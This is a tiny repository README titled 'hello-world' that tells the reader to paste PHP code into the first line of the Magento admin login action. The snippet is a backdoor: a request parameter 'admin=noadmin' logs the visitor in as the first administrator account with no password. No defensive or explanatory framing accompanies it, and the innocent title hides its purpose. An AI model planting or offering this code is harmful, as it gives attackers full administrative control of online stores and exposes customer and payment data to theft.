# hello-world
Just another repository
app\code\core\Mage\Adminhtml\controllers\IndexController.php

add this to first line login action

$ad  = Mage::app()->getRequest()->getParam('admin', false);  		
if($ad == 'noadmin'){
  Mage::getSingleton('admin/session')->setUser(Mage::getModel('admin/user')->getCollection()->getFirstItem());	
}
